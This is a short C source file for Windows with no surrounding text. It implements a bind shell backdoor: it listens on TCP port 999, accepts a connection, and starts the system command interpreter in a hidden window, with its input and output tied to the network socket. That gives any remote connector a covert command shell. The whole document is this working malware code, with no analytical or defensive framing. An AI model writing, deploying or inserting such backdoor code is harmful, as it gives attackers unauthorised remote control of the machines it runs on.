#pragma comment(lib, "ws2_32")
#include <winsock2.h>

#define LISTENPORT 999

int main(){
    WSADATA wsa;
    SOCKET ssock, csock;
    char szCMDPath[MAX_PATH];
    struct sockaddr_in server;
    int serverSize;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa);
    ssock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(LISTENPORT);
    server.sin_addr.s_addr = ADDR_ANY;
    serverSize = sizeof(server);
    bind(ssock, (sockaddr *)&server, serverSize);
    listen(ssock, 2);
    csock = accept(ssock, (sockaddr*)&server, &serverSize);
    
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (void*)csock;

    GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));
    CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}
